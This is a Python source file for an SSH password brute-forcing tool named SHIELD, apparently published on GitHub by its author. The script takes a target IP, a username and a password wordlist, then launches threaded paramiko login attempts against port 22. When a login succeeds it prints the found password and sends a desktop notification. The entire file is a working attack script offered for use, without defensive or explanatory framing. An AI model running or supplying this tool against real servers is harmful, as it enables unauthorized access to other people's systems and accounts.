import paramiko
import os
import sys
import socket
import threading, time
from termcolor import colored

exit_tag = 0
shield = '''
   ,----.    ,-.   ,----.,------. ,-.   ,-.,-. ,-.
    / ,-,_/  ,'  |  / / /`-, ,-','  |  / //  |/ /
   / / __  ,' ,| | / ,---'  / / ,' ,| | / //  / /
  / '-' /,' ,--. |/ /      / /,' ,--. |/ // /|  /
  `----''--'   `-'`'.--""""--.--'   `-'`' `' `-'
  nnnnnnnnnnnnnnnn,'.n*""""*N.`.#######################
  NNNNNNNNNNNNNNN/ J',n*""*n.`L \##### ### ### ### ####
                : J J___/\___L L :#####################
  nnnnnnnnnnnnnn{ [{ `SHIELD.' }] }## ### ### ### ### ##
  NNNNNNNNNNNNNN: T T /,'`.\ T J :#####################
                 \ L,`*n,,n*',J /
  nnnnnnnnnnnnnnnn`. *n,,,,n* ,'nnnnnnnnnnnnnnnnnnnnnnn
  NNNNNNNNNNNNNNNNNN`-..__..-'NNNNNNNNNNNNNNNNNNNNNNNNN
  ,-.    ,-.  ,-. ,----. ,----.,-. ,----.   ,-. 
  |  `.  \  `.|  \\  .--`\ \"L \\ \\ .-._\  |  `. 
  | |. `. \ \ ` L \\  __\ \ .  < \ \\ \  __ | |. `.
  | .--. `.\ \`-'\ \\ `---.\ \L `.\ \\ `-` \| .--. `. 
  `-'   `--``'    `-'`----' `-'`-' `' `----'`-'   `--' 		     


     '''

logo = '''
     ,----.    ,-.   ,----.,------. ,-.   ,-.,-. ,-.
    / ,-,_/  ,'  |  / / /`-, ,-','  |  / //  |/ /
   / / __  ,' ,| | / ,---'  / / ,' ,| | / //  / /
  / '-' /,' ,--. |/ /      / /,' ,--. |/ // /|  /
  `----''--'   `-'`'.--""""--.--'   `-'`' `' `-'
  nnnnnnnnnnnnnnnn,'.n*""""*N.`.#######################
  NNNNNNNNNNNNNNN/ J',n*""*n.`L \##### ### ### ### ####
                : J J___/\___L L :#####################
  nnnnnnnnnnnnnn{ [{ `.    ,' }] }## ### ### ### ### ##
  NNNNNNNNNNNNNN: T T /,'`.\ T J :#####################
                 \ L,`*n,,n*',J /
  nnnnnnnnnnnnnnnn`. *n,,,,n* ,'nnnnnnnnnnnnnnnnnnnnnnn
  NNNNNNNNNNNNNNNNNN`-..__..-'NNNNNNNNNNNNNNNNNNNNNNNNN
  ,-.    ,-.  ,-. ,----. ,----.,-. ,----.   ,-. 
  |  `.  \  `.|  \\  .--`\ \"L \\ \\ .-._\  |  `. 
  | |. `. \ \ ` L \\  __\ \ .  < \ \\ \  __ | |. `.
  | .--. `.\ \`-'\ \\ `---.\ \L `.\ \\ `-` \| .--. `. 
  `-'   `--``'    `-'`----' `-'`-' `' `----'`-'   `--'

------------------------------------------------
                         
By Emre Koybasi https://github.com/emrekybs
'''
print(logo)
time.sleep(1.5)
print("\n SHIELD SSH Attack Starting...")
os.system("notify-send 'Shield Successfully initiated'")
time.sleep(2)
if len(sys.argv) != 4:
  print(colored("\n[*]usage python3 shield.py <Target Ip> <username> <password-file>\n\n", 'white', attrs=['reverse', 'blink']))
  sys.exit(0)

target_ip = sys.argv[1]
username = sys.argv[2]
password_file = sys.argv[3]


def ssh_connect(password, code=0):
  global exit_tag
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    ssh.connect(target_ip, port=22, username=username, password=password)
    exit_tag = 1
    print(colored(f"\n[+]SSH Password For {username} found :> {password}    {shield}\n", "green", attrs=['bold']))
    os.system(f"notify-send 'Password Found::{password}'")
  except:
    print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
  ssh.close()

  ssh.close()
  return code

if os.path.exists(password_file) == False:
  print(colored("[!] File Not Found", 'red'))
  sys.exit(1)


with open(password_file, 'r') as file:
  for line in file.readlines():
    if exit_tag == 1:
      t.join()
      
      exit()
    password = line.strip()
    t = threading.Thread(target=ssh_connect, args=(password,))
    t.start()
   
    time.sleep(0.5)
    
